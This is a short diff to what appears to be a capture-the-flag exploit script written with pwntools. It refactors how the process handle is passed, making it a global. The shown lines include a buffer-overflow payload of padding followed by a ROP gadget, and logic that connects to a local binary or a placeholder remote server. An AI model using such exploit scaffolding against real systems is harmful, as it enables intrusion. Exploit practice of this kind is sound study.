@@ -10,7 +10,7 @@ SERVER = "the.server.goes.here"
 PORT = 1337
 
 
-def exploit(p):
+def exploit():
     # Payload start...
     payload = b'A' * 64  # Padding
     payload += pop_rdx
@@ -45,6 +45,7 @@ def start_exploit(binary, no_pause):
     If given a local binary to exploit, run the exploit locally.
     Otherwise, connect to a remote server.
     """
+    global p
     p = process([binary]) if binary else remote(SERVER, PORT)
 
     # Pause the process and show the PID giving time for a debugger to attach
@@ -52,7 +53,7 @@ def start_exploit(binary, no_pause):
         click.echo(f"[+] PID: {util.proc.pidof(p)}")
         pause()
 
-    exploit(p)
+    exploit()
     click.echo("[*] Exiting...")
     p.kill() if binary else p.close()
 
